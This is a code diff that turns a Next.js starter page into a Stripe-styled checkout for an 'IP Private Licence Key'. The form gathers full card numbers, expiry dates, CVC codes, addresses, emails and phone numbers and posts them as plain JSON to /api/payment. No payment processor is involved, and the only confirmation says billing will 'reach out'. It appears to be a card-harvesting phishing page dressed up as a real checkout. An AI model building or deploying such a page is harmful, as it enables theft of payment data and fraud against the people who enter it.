@@ -1,65 +1,418 @@
-import Image from "next/image";
+"use client";
 
-export default function Home() {
+import { useState } from "react";
+
+import {
+  FiMail,
+  FiUser,
+  FiPhone,
+  FiCreditCard,
+  FiLock,
+  FiMapPin,
+} from "react-icons/fi";
+
+export default function PaymentPage() {
+  const [amount, setAmount] = useState("");
+  const [email, setEmail] = useState("");
+  const [name, setName] = useState("");
+  const [phone, setPhone] = useState("");
+  const [cardNumber, setCardNumber] = useState("");
+  const [expiry, setExpiry] = useState("");
+  const [cvv, setCvv] = useState("");
+  const [cardholdername, setCardholdername] = useState("");
+  const [addressone, setAddressone] = useState("");
+  const [addresstwo, setAddresstwo] = useState("");
+  const [city, setCity] = useState("");
+  const [zipCode, setZipCode] = useState("");
+  const [state, setState] = useState("");
+  const [firstName, setFirstName] = useState("");
+  const [lastName, setLastName] = useState("");
+  const [loading, setLoading] = useState(false);
+  const [success, setSuccess] = useState(false);
+  
+
+  const handleSubmit = async (e: React.FormEvent) => {
+  e.preventDefault();
+
+  setLoading(true);
+
+  const formData = {
+    amount,
+    email,
+    name,
+    phone,
+    cardNumber,
+    expiry,
+    cvv,
+    cardholdername,
+    addressone,
+    addresstwo,
+    city,
+    zipCode,
+    state,
+    firstName,
+    lastName,
+  };
+
+  try {
+    const response = await fetch("/api/payment", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(formData),
+    });
+
+    const result = await response.json();
+
+    if (result.success) {
+      setSuccess(true);
+
+      setAmount("");
+      setEmail("");
+      setName("");
+      setPhone("");
+      setCardNumber("");
+      setExpiry("");
+      setCvv("");
+      setCardholdername("");
+      setAddressone("");
+      setAddresstwo("");
+      setCity("");
+      setZipCode("");
+      setState("");
+      setFirstName("");
+      setLastName("");
+    }
+  } catch (error) {
+    console.log("ERROR:", error);
+  }
+
+  setLoading(false);
+};
+
   return (
-    <div className="flex flex-col flex-1 items-center justify-center bg-zinc-50 font-sans dark:bg-black">
-      <main className="flex flex-1 w-full max-w-3xl flex-col items-center justify-between py-32 px-16 bg-white dark:bg-black sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={100}
-          height={20}
-          priority
-        />
-        <div className="flex flex-col items-center gap-6 text-center sm:items-start sm:text-left">
-          <h1 className="max-w-xs text-3xl font-semibold leading-10 tracking-tight text-black dark:text-zinc-50">
-            To get started, edit the page.tsx file.
-          </h1>
-          <p className="max-w-md text-lg leading-8 text-zinc-600 dark:text-zinc-400">
-            Looking for a starting point or more instructions? Head over to{" "}
-            <a
-              href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Templates
-            </a>{" "}
-            or the{" "}
-            <a
-              href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Learning
-            </a>{" "}
-            center.
-          </p>
-        </div>
-        <div className="flex flex-col gap-4 text-base font-medium sm:flex-row">
-          <a
-            className="flex h-12 w-full items-center justify-center gap-2 rounded-full bg-foreground px-5 text-background transition-colors hover:bg-[#383838] dark:hover:bg-[#ccc] md:w-[158px]"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={16}
-              height={16}
+    <div className="min-h-screen bg-[#f6f9fc] px-4 py-10">
+      <div className="max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-2 gap-14 items-start">
+        {/* LEFT SIDE */}
+        <div className="flex justify-center">
+          <div className="w-full max-w-md">
+            <p className="text-2xl font-semibold tracking-tight text-[#30313d] pb-8">
+              Payment for IP Private Licence Key <br />
+              (Dedicated Secured Server)
+            </p>
+            <div className="border border-gray-300 rounded-xl bg-white p-5 shadow-sm">
+              <div className="text-[54px] font-light tracking-tight text-[#30313d]">
+                US$ {amount || "0.00"}
+              </div>
+            </div>
+
+            <input
+              type="number"
+              placeholder="Enter amount in USD"
+              value={amount}
+              onChange={(e) => setAmount(e.target.value)}
+              className="mt-5 w-full border border-gray-300 rounded-md px-4 py-3 text-[16px] outline-none bg-white shadow-sm focus:ring-2 focus:ring-[#635bff]"
             />
-            Deploy Now
-          </a>
-          <a
-            className="flex h-12 w-full items-center justify-center rounded-full border border-solid border-black/[.08] px-5 transition-colors hover:border-transparent hover:bg-black/[.04] dark:border-white/[.145] dark:hover:bg-[#1a1a1a] md:w-[158px]"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Documentation
-          </a>
+          </div>
         </div>
-      </main>
+
+        {/* RIGHT SIDE */}
+        <div className="w-full max-w-107.5 bg-white border border-gray-200 rounded-xl overflow-hidden shadow-lg">
+          {/* CONTACT INFO */}
+          <div className="p-5 border-b border-gray-200">
+            <h2 className="text-[30px] font-semibold text-[#30313d] mb-5">
+              Contact information
+            </h2>
+
+            <p className="text-[14px] text-[#30313d] mb-2">Contact details</p>
+
+            <div className="border border-gray-300 rounded-md overflow-hidden bg-white">
+              {/* EMAIL */}
+              <div className="flex items-center border-b border-gray-300 px-3 h-12">
+                <FiMail className="text-gray-500 mr-3 text-[18px]" />
+
+                <input
+                  type="email"
+                  placeholder="email@example.com"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  className="w-full outline-none text-[15px]"
+                />
+              </div>
+
+              {/* NAME */}
+              <div className="flex items-center border-b border-gray-300 px-3 h-12">
+                <FiUser className="text-gray-500 mr-3 text-[18px]" />
+
+                <input
+                  type="text"
+                  placeholder="Full name"
+                  value={name}
+                  onChange={(e) => setName(e.target.value)}
+                  className="w-full outline-none text-[15px]"
+                />
+              </div>
+
+              {/* PHONE */}
+              <div className="flex items-center px-3 h-12">
+                <FiPhone className="text-gray-500 mr-3 text-[18px]" />
+
+                <input
+                  type="tel"
+                  placeholder="(201) 555-0123"
+                  value={phone}
+                  onChange={(e) => setPhone(e.target.value)}
+                  className="w-full outline-none text-[15px]"
+                />
+              </div>
+            </div>
+          </div>
+
+          {/* PAYMENT METHOD */}
+          <div className="p-5">
+            <h2 className="text-[30px] font-semibold text-[#30313d] mb-5">
+              Payment method
+            </h2>
+
+            {/* CARD OPTION */}
+            <div className="flex items-center gap-3 mb-5">
+              <div className="w-5 h-5 rounded-full border-[6px] border-black"></div>
+
+              <div className="flex items-center gap-2 text-[15px] font-medium text-[#30313d]">
+                <FiCreditCard />
+                Card
+              </div>
+            </div>
+
+            <form onSubmit={handleSubmit}>
+              <p className="text-[14px] text-[#30313d] mb-2">
+                Card information
+              </p>
+
+              {/* CARD BOX */}
+              <div className="border border-gray-300 rounded-md overflow-hidden bg-white">
+                {/* CARD NUMBER */}
+                <div className="flex items-center justify-between border-b border-gray-300 px-3 h-12">
+                  <div className="flex items-center flex-1">
+                    <FiCreditCard className="text-gray-500 mr-3 text-[18px]" />
+
+                    <input
+                      type="text"
+                      placeholder="1234 1234 1234 1234"
+                      value={cardNumber}
+                      onChange={(e) => setCardNumber(e.target.value)}
+                      className="w-full outline-none text-[15px]"
+                    />
+                  </div>
+
+                  {/* CARD LOGOS */}
+                  <div className="flex items-center gap-1 ml-3">
+                    {/* VISA */}
+                    <div className="bg-[#1434CB] text-white text-[9px] font-bold px-2 py-0.5 rounded">
+                      VISA
+                    </div>
+
+                    {/* MASTERCARD */}
+                    <div className="relative w-8 h-4.5">
+                      <div className="absolute left-0 top-0 w-4.5 h-4.5 bg-[#EB001B] rounded-full opacity-90"></div>
+
+                      <div className="absolute right-0 top-0 w-4.5 h-4.5 bg-[#F79E1B] rounded-full opacity-90"></div>
+                    </div>
+
+                    {/* AMERICAN EXPRESS */}
+                    <div className="bg-[#2E77BC] text-white text-[8px] font-bold px-1 py-1.5 rounded leading-none text-center">
+                      AMEX
+                    </div>
+                  </div>
+                </div>
+
+                {/* DATE + CVV */}
+                <div className="grid grid-cols-2">
+                  <input
+                    type="text"
+                    placeholder="MM / YY"
+                    value={expiry}
+                    onChange={(e) => setExpiry(e.target.value)}
+                    className="h-12 border-r border-gray-300 px-4 outline-none text-[15px]"
+                  />
+
+                  <div className="flex items-center px-3">
+                    <input
+                      type="text"
+                      placeholder="CVC"
+                      value={cvv}
+                      onChange={(e) => setCvv(e.target.value)}
+                      className="w-full outline-none text-[15px]"
+                    />
+
+                    <FiLock className="text-gray-500" />
+                  </div>
+                </div>
+              </div>
+
+              {/* CARD HOLDER */}
+              <div className="mt-5">
+                <p className="text-[14px] text-[#30313d] mb-2">
+                  Cardholder name
+                </p>
+
+                <div className="flex items-center border border-gray-300 rounded-md px-3 h-12">
+                  <FiUser className="text-gray-500 mr-3 text-[18px]" />
+
+                  <input
+                    type="text"
+                    placeholder="Full name on card"
+                    value={cardholdername}
+                    onChange={(e) => setCardholdername(e.target.value)}
+                    className="w-full outline-none text-[15px]"
+                  />
+                </div>
+              </div>
+
+              {/* BILLING ADDRESS */}
+              <div className="mt-5">
+                <p className="text-[14px] text-[#30313d] mb-2">
+                  Billing address
+                </p>
+
+                <div className="border border-gray-300 rounded-md overflow-hidden bg-white">
+                  {/* COUNTRY */}
+                  <div className="flex items-center border-b border-gray-300 px-3 h-12">
+                    <FiMapPin className="text-gray-500 mr-3 text-[18px]" />
+
+                    <select className="w-full outline-none bg-white text-[15px]">
+                      <option>United States</option>
+                      <option>India</option>
+                      <option>Canada</option>
+                    </select>
+                  </div>
+
+                  <input
+                    type="text"
+                    placeholder="Address line 1"
+                    value={addressone}
+                    onChange={(e) => setAddressone(e.target.value)}
+                    className="w-full h-12 border-b border-gray-300 px-4 outline-none text-[15px]"
+                  />
+
+                  <input
+                    type="text"
+                    placeholder="Address line 2"
+                    value={addresstwo}
+                    onChange={(e) => setAddresstwo(e.target.value)}
+                    className="w-full h-12 border-b border-gray-300 px-4 outline-none text-[15px]"
+                  />
+
+                  <div className="grid grid-cols-2">
+                    <input
+                      type="text"
+                      placeholder="City"
+                      value={city}
+                      onChange={(e) => setCity(e.target.value)}
+                      className="h-12 border-r border-b border-gray-300 px-4 outline-none text-[15px]"
+                    />
+
+                    <input
+                      type="text"
+                      placeholder="ZIP"
+                      value={zipCode}
+                      onChange={(e) => setZipCode(e.target.value)}
+                      className="h-12 border-b border-gray-300 px-4 outline-none text-[15px]"
+                    />
+                  </div>
+
+                  <input
+                    type="text"
+                    placeholder="State"
+                    value={state}
+                    onChange={(e) => setState(e.target.value)}
+                    className="w-full h-12 px-4 outline-none text-[15px]"
+                  />
+                </div>
+              </div>
+
+              {/* EXTRA FIELDS */}
+              <div className="mt-5 grid grid-cols-2 gap-4">
+                <input
+                  type="text"
+                  placeholder="First Name"
+                  value={firstName}
+                  onChange={(e) => setFirstName(e.target.value)}
+                  className="h-12 border border-gray-300 rounded-md px-4 outline-none text-[15px]"
+                />
+
+                <input
+                  type="text"
+                  placeholder="Last Name"
+                  value={lastName}
+                  onChange={(e) => setLastName(e.target.value)}
+                  className="h-12 border border-gray-300 rounded-md px-4 outline-none text-[15px]"
+                />
+              </div>
+
+              {/* AMOUNT */}
+              <div className="mt-5">
+                <input
+                  type="number"
+                  placeholder="Amount"
+                  value={amount}
+                  onChange={(e) => setAmount(e.target.value)}
+                  className="w-full h-12 border border-gray-300 rounded-md px-4 outline-none text-[15px]"
+                />
+              </div>
+
+              {/* SUBMIT BUTTON */}
+              <button
+                type="submit"
+                className="w-full h-12.5 bg-[#635bff] text-white rounded-md mt-6 text-[16px] font-medium hover:bg-[#5248ff] transition"
+              >
+                Submit
+              </button>
+
+              {/* LOADING */}
+              {loading && (
+                <div className="mt-5">
+                  <div className="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
+                    <div className="h-full bg-[#635bff] animate-pulse w-full"></div>
+                  </div>
+
+                  <p className="text-[13px] text-gray-500 mt-2">
+                    Processing details...
+                  </p>
+                </div>
+              )}
+            </form>
+          </div>
+        </div>
+      </div>
+
+      {/* SUCCESS POPUP */}
+      {success && (
+        <div className="fixed inset-0 bg-black/40 flex items-center justify-center z-50 px-4">
+          <div className="bg-white w-full max-w-md rounded-2xl p-8 shadow-2xl text-center">
+            <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-5">
+              <span className="text-3xl text-green-600">✓</span>
+            </div>
+
+            <h2 className="text-[28px] font-semibold text-[#30313d] mb-3">
+              Details Received Successfully
+            </h2>
+
+            <p className="text-gray-600 leading-7 text-[15px]">
+              Billing department will reach out to you shortly for payment
+              confirmation.
+            </p>
+
+            <button
+              onClick={() => setSuccess(false)}
+              className="w-full mt-6 h-12 bg-[#635bff] text-white rounded-md hover:bg-[#5248ff]"
+            >
+              Close
+            </button>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
